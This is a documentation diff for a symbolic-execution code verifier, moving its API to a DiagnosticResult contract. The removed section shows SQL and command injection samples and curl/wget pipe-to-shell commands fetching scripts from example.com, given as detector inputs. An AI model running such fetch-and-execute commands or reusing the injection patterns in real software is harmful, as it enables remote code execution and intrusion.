@@ -1,242 +1,322 @@
 ---
 sidebar_position: "4"
 title: "Code engine"
-description: "QWED's Code Engine uses CrossHair symbolic execution to verify Python code correctness, detect vulnerabilities like SQL injection and XSS, without running code."
+description: "QWED's Code Engine uses CrossHair symbolic execution to verify Python code correctness and detect counterexamples without running it. Returns DiagnosticResult from v5.3.0."
 ---
 
-<Info>Updated in v5.1.0: The legacy `CodeExecutor` class is now hard-blocked. All code execution uses `SecureCodeExecutor` exclusively. See the [changelog](/changelog#v5-1-0-—-agent-state-governance-and-fail-closed-hardening) for migration details.</Info>
+<Info>
+**Updated in v5.3.0 (breaking).** Every `SymbolicVerifier` public method now returns a [`DiagnosticResult`](/advanced/diagnostics) instead of an ad-hoc dict. See the [migration section](#migrating-from-the-legacy-dict-api) for a field-by-field mapping. The Code Engine is the first fully `DiagnosticResult`-conformant engine and serves as the reference implementation for future engine migrations.
+</Info>
 
-The Code Engine uses [CrossHair](https://github.com/pschanely/crosshair), a symbolic execution tool for Python, to verify code correctness without running it.
+The Code Engine uses [CrossHair](https://github.com/pschanely/crosshair), a symbolic execution tool for Python, to verify code properties without running it.
 
 ---
 
 ## Capabilities
 
-| Feature                     | Description                   |
-| --------------------------- | ----------------------------- |
-| **Property Verification**   | Verify pre/post conditions    |
-| **Safety Checks**           | Division by zero, null checks |
-| **Vulnerability Detection** | SQL injection, XSS            |
-| **Type Checking**           | Runtime type violations       |
-| **Boundary Analysis**       | Edge case detection           |
+| Feature                     | Description                                             |
+| --------------------------- | ------------------------------------------------------- |
+| **Symbolic verification**   | CrossHair-driven property checking on typed functions   |
+| **Contract verification**   | Precondition and postcondition assertions               |
+| **Safety analysis**         | Division-by-zero and index-out-of-bounds hazards        |
+| **Bounded model checking**  | Verify under explicit loop and recursion bounds         |
+| **Complexity analysis**     | Loops, recursions, and path-budget estimates            |
 
 ---
 
 ## Quick start
 
 ```python
-from qwed_sdk import QWEDClient
+from qwed_new.core.symbolic_verifier import SymbolicVerifier
 
-client = QWEDClient()
+verifier = SymbolicVerifier()
 
-code = '''
+code = """
 def divide(a: int, b: int) -> float:
     return a / b
-'''
+"""
 
-result = client.verify_code(code)
-print(result.verified)      # False
-print(result.issues[0])     # "Division by zero possible when b=0"
+result = verifier.verify_code(code)
+print(result.status)               # DiagnosticStatus.UNVERIFIABLE
+print(result.is_verified)          # False
+print(result.agent_message)        # "Symbolic verification found a counterexample..."
+print(result.developer_fields["constraint_id"])
+# "symbolic_verifier.counterexample_found"
 ```
+
+Every method on `SymbolicVerifier` returns a `DiagnosticResult` with the same three layers described in [Verification Diagnostics](/advanced/diagnostics): a Layer 1 `agent_message`, a Layer 2 `developer_fields` dict, and a Layer 3 `proof_ref` (always `None` for this engine — see [Why `VERIFIED` is never emitted](#why-verified-is-never-emitted)).
 
 ---
 
-## Safety verification
+## The `DiagnosticResult` contract
 
-### Division by zero
+All six public methods — `verify_code`, `verify_function_contract`, `verify_safety_properties`, `verify_bounded`, `analyze_complexity`, `get_verification_budget` — return a `DiagnosticResult`.
+
+### Status values
+
+| `result.status`                    | Meaning                                                                 |
+| ---------------------------------- | ----------------------------------------------------------------------- |
+| `DiagnosticStatus.VERIFIED`        | **Never emitted by this engine.** See [below](#why-verified-is-never-emitted). |
+| `DiagnosticStatus.UNVERIFIABLE`    | Analysis ran but proof was incomplete, timed out, or found a counterexample. |
+| `DiagnosticStatus.BLOCKED`         | Verification could not be attempted (parse error, no functions, CrossHair missing). |
+
+Read the specific reason from `result.developer_fields["constraint_id"]`.
+
+### Common `developer_fields` keys
+
+Every result carries `verification_mode` so callers can tell a plain symbolic run from a bounded run:
+
+| Key                   | Type    | Description                                                                                              |
+| --------------------- | ------- | -------------------------------------------------------------------------------------------------------- |
+| `constraint_id`       | string  | Structured reason code, e.g. `symbolic_verifier.counterexample_found`.                                   |
+| `verification_mode`   | string  | `"symbolic"` for standard runs, `"bounded_symbolic"` for `verify_bounded()`.                             |
+| `advisory_checks`     | array   | Non-proof-bearing analysis attached for developer or auditor review. Never influences the verdict.       |
+
+Method-specific keys (function counts, loop lists, budget estimates) are documented in the sections below.
+
+### Why `VERIFIED` is never emitted
+
+CrossHair's search is timeout-bounded, not a completeness proof. "No counterexample found" is not the same as "no counterexample exists," so a clean run maps to `UNVERIFIABLE` with `constraint_id = "symbolic_verifier.no_counterexample_found"` — never to `VERIFIED`. The `DiagnosticResult` contract structurally requires a `proof_ref` for `VERIFIED`, and this engine has no proof artifact to bind.
+
+Downstream policy gates must reject `UNVERIFIABLE` results for control flow. Treat symbolic-execution output as a bug hunter, not an authority.
+
+---
+
+## Symbolic verification
+
+`verify_code()` walks the AST, extracts every function with type annotations, and runs CrossHair on each one.
 
 ```python
-# UNSAFE - can crash
+result = verifier.verify_code(code)
+
+if result.is_verified:
+    ...  # Never happens for this engine — see above
+else:
+    reason = result.developer_fields["constraint_id"]
+    checked = result.developer_fields["functions_checked"]
+    verified = result.developer_fields["functions_verified"]
+    issues = result.developer_fields["issues"]
+```
+
+`developer_fields` on `verify_code()` results:
+
+| Key                          | Description                                                        |
+| ---------------------------- | ------------------------------------------------------------------ |
+| `functions_discovered`       | Total functions found in the source.                               |
+| `functions_checked`          | Functions actually submitted to CrossHair.                         |
+| `functions_verified`         | Functions CrossHair proved (no counterexample and no timeout).     |
+| `functions_skipped`          | Functions with no type annotations.                                |
+| `functions_unverifiable`     | Functions that could not be proven (skipped, timed out, or errored). |
+| `counterexamples_found`      | Count of counterexample issues reported by CrossHair.              |
+| `timeouts_found`             | Count of timeout issues.                                           |
+| `issues`                     | Per-function issue records with `type`, `function`, and `description`. |
+
+<Warning>
+`verify_code()` no longer accepts `check_assertions` — the parameter was never wired up. The current signature is `verify_code(self, code: str) -> DiagnosticResult`. Passing extra keyword arguments raises `TypeError`.
+</Warning>
+
+### Counterexample: division by zero
+
+```python
+result = verifier.verify_code("""
 def divide(a: int, b: int) -> float:
     return a / b
+""")
 
-# SAFE - guarded
-def divide_safe(a: int, b: int) -> float:
-    if b == 0:
-        raise ValueError("Cannot divide by zero")
-    return a / b
+result.status                                        # DiagnosticStatus.UNVERIFIABLE
+result.developer_fields["constraint_id"]             # "symbolic_verifier.counterexample_found"
+result.developer_fields["counterexamples_found"]     # 1
+result.developer_fields["issues"][0]["type"]         # "counterexample"
 ```
+
+### Untyped function: fails closed
+
+CrossHair requires type hints. Untyped functions are reported as skipped and unverifiable — the result cannot be `is_verified: True`.
 
 ```python
-result = client.verify_code(unsafe_code)
-# Issues: ["Division by zero when b=0"]
+result = verifier.verify_code("""
+def add(a, b):
+    return a + b
+""")
 
-result = client.verify_code(safe_code)
-# Verified: True, Issues: []
+result.developer_fields["constraint_id"]         # "symbolic_verifier.no_typed_functions"
+result.developer_fields["functions_discovered"]  # 1
+result.developer_fields["functions_checked"]     # 0
+result.developer_fields["functions_skipped"]     # 1
 ```
 
-### Null pointer / None access
-
-```python
-# UNSAFE
-def get_name(user: Optional[User]) -> str:
-    return user.name  # May crash if user is None
-
-# SAFE
-def get_name_safe(user: Optional[User]) -> str:
-    if user is None:
-        return "Guest"
-    return user.name
-```
-
-### Index out of bounds
-
-```python
-# UNSAFE
-def first_element(items: List[int]) -> int:
-    return items[0]  # Crashes on empty list
-
-# SAFE
-def first_element_safe(items: List[int]) -> int:
-    if not items:
-        raise ValueError("List is empty")
-    return items[0]
-```
+See [Symbolic execution limits](/advanced/symbolic-limits) for the full fail-closed matrix.
 
 ---
 
 ## Contract verification
 
-### Preconditions
+`verify_function_contract()` injects preconditions as `assert` statements and re-runs `verify_code()` against the decorated source.
 
 ```python
-code = '''
+result = verifier.verify_function_contract(
+    code="""
 def sqrt(x: float) -> float:
-    """
-    pre: x >= 0
-    """
     return x ** 0.5
-'''
-
-result = client.verify_code(code)
-# Verifies that callers must pass x >= 0
+""",
+    function_name="sqrt",
+    preconditions=["x >= 0"],
+    postconditions=["__return__ >= 0"],
+)
 ```
 
-### Postconditions
-
-```python
-code = '''
-def abs_value(x: int) -> int:
-    """
-    post: __return__ >= 0
-    """
-    return x if x >= 0 else -x
-'''
-
-result = client.verify_code(code)
-# Verifies result is always >= 0
-```
-
-### Full contract
-
-```python
-code = '''
-def binary_search(arr: List[int], target: int) -> int:
-    """
-    pre: arr == sorted(arr)  # Array must be sorted
-    post: __return__ == -1 or arr[__return__] == target
-    """
-    # implementation...
-'''
-
-result = client.verify_code(code)
-```
+The returned `DiagnosticResult` follows the same shape as `verify_code()`. Read `result.developer_fields["issues"]` to find failing assertions.
 
 ---
 
-## Security scanning
+## Safety property analysis
 
-### SQL injection
-
-```python
-code = '''
-def get_user(username: str) -> str:
-    query = f"SELECT * FROM users WHERE name = '{username}'"
-    return execute(query)
-'''
-
-result = client.verify_code(code, check_security=True)
-# Issues: ["SQL Injection vulnerability: unsanitized input in query"]
-```
-
-### Command injection
+`verify_safety_properties()` scans the AST for division-by-zero and index-out-of-bounds hazards. It always returns `UNVERIFIABLE` (the check is advisory and does not prove the code is safe) with structured details in `developer_fields`.
 
 ```python
-code = '''
-def run_command(user_input: str):
-    os.system(f"echo {user_input}")
-'''
+result = verifier.verify_safety_properties("""
+def divide(a: int, b: int) -> float:
+    return a / b
+""")
 
-result = client.verify_code(code, check_security=True)
-# Issues: ["Command injection vulnerability"]
+result.developer_fields["is_safe"]              # False
+result.developer_fields["warnings"]             # 1
+result.developer_fields["errors"]               # 0
+result.developer_fields["issues"][0]["type"]    # "potential_division_by_zero"
 ```
 
-### Remote code execution (pipe-to-shell)
+The `advisory_checks` array carries a `safety_properties` entry with the same summary counts.
 
-The Code Engine detects `curl` or `wget` commands piped into a shell through `subprocess`. Detection uses two layers:
+---
 
-1. **Regex scanning** matches known attack patterns across the full source text, including multi-line invocations.
-2. **AST analysis** catches obfuscated variants that use f-strings, list arguments, or variable interpolation.
+## Bounded model checking
 
-The engine applies two severity tiers:
-
-- **Strict match** — `subprocess` call with `curl`/`wget` piped to `bash`/`sh` **and** `shell=True`. Message: `"Remote code execution via shell=True with curl/wget pipe to shell."`
-- **Heuristic match** — same pipe-to-shell pattern **without** `shell=True`. Message: `"Suspicious curl/wget pipe-to-shell pattern detected (heuristic)."`
-
-Both tiers are reported as `CRITICAL` severity with issue type `remote_code_execution`.
+`verify_bounded()` transforms the source to inject loop counters and recursion-depth checks, then calls `verify_code()` on the rewritten source. Every result from this method sets `verification_mode = "bounded_symbolic"` and includes the applied bounds plus the underlying complexity analysis.
 
 ```python
-code = '''
-import subprocess
-subprocess.run("curl http://example.com/install.sh | bash", shell=True)
-'''
+result = verifier.verify_bounded(
+    code=code,
+    loop_bound=50,
+    recursion_depth=20,
+)
 
-result = client.verify_code(code, check_security=True)
-# Issues: [{"type": "remote_code_execution", "severity": "CRITICAL"}]
+result.developer_fields["verification_mode"]     # "bounded_symbolic"
+result.developer_fields["bounds_applied"]        # {"loop_bound": 50, "recursion_depth": 20, "prioritized": True}
+result.developer_fields["complexity_analysis"]   # {"loops": [...], "recursions": [...], ...}
 ```
 
-In addition to pipe (`|`), the detection also matches commands chained with `;` or `&&`:
+If the bounded-model transform itself fails, `verify_bounded()` returns `BLOCKED` with `constraint_id = "symbolic_verifier.bounds_transform_error"` instead of silently falling back to the untransformed source.
 
-```python
-code = '''
-import subprocess
-subprocess.call("wget http://example.com/payload.sh && bash payload.sh", shell=True)
-'''
-
-result = client.verify_code(code, check_security=True)
-# Issues: [{"type": "remote_code_execution", "severity": "CRITICAL"}]
-```
-
-<Note>
-This check covers `subprocess.run`, `subprocess.call`, `subprocess.Popen`, and `subprocess.check_output`. The AST-based analysis catches patterns that span multiple lines or use dynamic string construction such as f-strings.
-</Note>
+See [Bounded model checking](/advanced/symbolic-limits#bounded-model-checking) for configuration guidance and preset budgets.
 
 ---
 
 ## Complexity analysis
 
+`analyze_complexity()` counts loops, direct and mutual recursions, and maximum loop-nesting depth. The result is always `UNVERIFIABLE` — the analysis is advisory and produces no proof.
+
 ```python
-code = '''
+result = verifier.analyze_complexity("""
 def bubble_sort(arr: List[int]) -> List[int]:
     n = len(arr)
     for i in range(n):
-        for j in range(n-1):
-            if arr[j] > arr[j+1]:
-                arr[j], arr[j+1] = arr[j+1], arr[j]
+        for j in range(n - 1):
+            if arr[j] > arr[j + 1]:
+                arr[j], arr[j + 1] = arr[j + 1], arr[j]
     return arr
-'''
+""")
 
-result = client.analyze_complexity(code)
-print(result.complexity)      # "O(n²)"
-print(result.loop_depth)      # 2
-print(result.recursive)       # False
+result.developer_fields["total_loops"]              # 2
+result.developer_fields["max_loop_depth"]           # 2
+result.developer_fields["total_recursive_functions"] # 0
+result.developer_fields["complexity_score"]         # 4
+result.developer_fields["recommendation"]["risk_level"] # "medium"
 ```
+
+Use `recommendation` to pick sensible bounds for a follow-up `verify_bounded()` call.
+
+---
+
+## Verification budget
+
+`get_verification_budget()` estimates the number of symbolic paths CrossHair would explore, so callers can decide whether to attempt verification or fall back to a cheaper check.
+
+```python
+result = verifier.get_verification_budget(code, max_paths=1000)
+
+result.developer_fields["estimated_paths"]    # e.g. 200
+result.developer_fields["max_paths"]          # 1000
+result.developer_fields["feasible"]           # True
+```
+
+Both this method and `analyze_complexity()` are advisory — treat their output as heuristics, not proof. The result carries an `advisory_checks` entry with the same summary details.
+
+---
+
+## Migrating from the legacy dict API
+
+Before v5.3.0, `SymbolicVerifier` methods returned ad-hoc dicts (`result.verified`, `result["issues"]`, `result["complexity"]`, and so on). v5.3.0 removes those return types entirely — every method now returns a `DiagnosticResult`. Update your call sites using the map below.
+
+### Field cheat sheet
+
+| Legacy field                   | Replacement                                                                 |
+| ------------------------------ | --------------------------------------------------------------------------- |
+| `result.verified`              | `result.is_verified` (always `False` for this engine)                       |
+| `result["status"]` (string)    | `result.status` (`DiagnosticStatus` enum) and `developer_fields["constraint_id"]` |
+| `result["message"]`            | `result.agent_message`                                                      |
+| `result["issues"]`             | `result.developer_fields["issues"]`                                         |
+| `result["functions_checked"]`  | `result.developer_fields["functions_checked"]`                              |
+| `result["complexity"]` / `"loop_depth"` / `"recursive"` | `result.developer_fields["complexity_score"]`, `"max_loop_depth"`, `"total_recursive_functions"` |
+| `result["is_safe"]`            | `result.developer_fields["is_safe"]`                                        |
+| `result["bounds_applied"]`     | `result.developer_fields["bounds_applied"]`                                 |
+| n/a                            | `result.developer_fields["verification_mode"]` — new, `"symbolic"` or `"bounded_symbolic"` |
+| n/a                            | `result.proof_ref` — always `None` for this engine                          |
+
+### Before
+
+```python
+result = verifier.verify_code(code)
+
+if result["status"] == "verified":
+    admit(payload)
+elif result["status"] == "counterexamples_found":
+    for issue in result["issues"]:
+        log(issue["description"])
+else:
+    reject(payload, reason=result["message"])
+```
+
+### After
+
+```python
+from qwed_new.core.diagnostics import DiagnosticStatus
+
+result = verifier.verify_code(code)
+
+# This engine never emits VERIFIED — treat every result as unverified for
+# control flow, and use developer_fields for the specific reason.
+reject(payload, reason=result.agent_message)
+
+if result.status is DiagnosticStatus.UNVERIFIABLE:
+    reason = result.developer_fields["constraint_id"]
+    if reason == "symbolic_verifier.counterexample_found":
+        for issue in result.developer_fields["issues"]:
+            log(issue["description"])
+```
+
+<Warning>
+Do not gate control flow on `is_verified` for symbolic-engine results — it is always `False`. Downstream authority checks must inspect `result.proof_ref`, which this engine intentionally leaves as `None`. See [Verification Diagnostics](/advanced/diagnostics) for the full 3-layer contract.
+</Warning>
+
+### Removed parameters
+
+- `verify_code(code, check_assertions=...)` — the parameter was never used. Remove it from your call sites; passing it now raises `TypeError`.
 
 ---
 
 ## Language support
 
-| Language   | Support Level  |
+| Language   | Support level  |
 | ---------- | -------------- |
 | Python     | Full           |
 | JavaScript | Basic (coming) |
@@ -245,32 +325,9 @@ print(result.recursive)       # False
 
 ---
 
-## Configuration
-
-```python
-result = client.verify_code(
-    code,
-    timeout=30,              # Max verification time
-    check_security=True,     # Enable security checks
-    check_types=True,        # Enable type checking
-    max_iterations=100       # Bounded model checking limit
-)
-```
-
----
-
-## Performance
-
-| Code Size    | Avg Latency |
-| ------------ | ----------- |
-| \< 50 lines  | 200ms       |
-| 50-200 lines | 500ms       |
-| \> 200 lines | 1-5s        |
-
----
-
 ## Next steps
 
-- [SQL engine](./sql) - Verify SQL queries
-- [Logic engine](./logic) - Verify logical constraints
-- [Architecture](/architecture) - System overview
+- [Verification Diagnostics](/advanced/diagnostics) — the `DiagnosticResult` contract in depth
+- [Symbolic execution limits](/advanced/symbolic-limits) — when CrossHair works, when it doesn't, and how to bound it
+- [SQL engine](./sql) — verify SQL queries
+- [Logic engine](./logic) — verify logical constraints
